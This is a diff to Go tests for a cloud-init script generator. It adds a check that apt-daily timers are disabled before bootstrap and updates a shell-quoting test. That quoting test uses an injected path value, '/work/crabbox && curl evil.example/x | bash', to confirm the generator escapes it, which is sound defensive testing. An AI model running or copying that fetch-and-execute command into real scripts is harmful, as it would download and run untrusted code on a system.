@@ -92,6 +92,35 @@ func TestCloudInitStartsBootstrapBeforeCloudFinal(t *testing.T) {
 	}
 }
 
+func TestCloudInitQuiescesScheduledAptBeforeBootstrap(t *testing.T) {
+	var doc struct {
+		Bootcmd []string `yaml:"bootcmd"`
+	}
+	if err := yaml.Unmarshal([]byte(cloudInit(baseConfig(), "ssh-ed25519 fixture")), &doc); err != nil {
+		t.Fatal(err)
+	}
+	boot := strings.Join(doc.Bootcmd, "\n")
+	for _, want := range []string{
+		"systemctl disable --now --no-block apt-daily.timer apt-daily-upgrade.timer",
+		"systemctl mask apt-daily.service apt-daily-upgrade.service",
+	} {
+		index := strings.Index(boot, want)
+		if index < 0 || index >= strings.Index(boot, "cloud-init-per instance") {
+			t.Fatalf("%q must run on every boot before instance bootstrap", want)
+		}
+	}
+	for _, shell := range []string{"bash", "sh"} {
+		if runtime.GOOS == "windows" {
+			continue
+		}
+		cmd := exec.Command(shell, "-n")
+		cmd.Stdin = strings.NewReader(boot)
+		if out, err := cmd.CombinedOutput(); err != nil {
+			t.Fatalf("%s syntax: %v: %s", shell, err, out)
+		}
+	}
+}
+
 func TestLinuxReadinessGeneratedContract(t *testing.T) {
 	got := cloudInit(baseConfig(), "ssh-ed25519 test")
 	embedded := indentCloudInitScriptFile(indentCloudInitRuncmd(linuxMinimalReadinessBootstrap))
@@ -133,7 +162,7 @@ func TestCloudInitQuotesInjectedWorkRootInShellScript(t *testing.T) {
 	for _, want := range []string{
 		"test -w '/work/crabbox && curl evil.example/x | bash'",
 		"mkdir -p '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox/pnpm /var/cache/crabbox/npm",
-		"chown -R 'crabbox':'crabbox' '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox",
+		"python3 -I - 'crabbox' '/work/crabbox && curl evil.example/x | bash' '/var/cache/crabbox' ",
 	} {
 		if !strings.Contains(got, want) {
 			t.Fatalf("cloudInit() missing quoted work root %q in:\n%s", want, got)
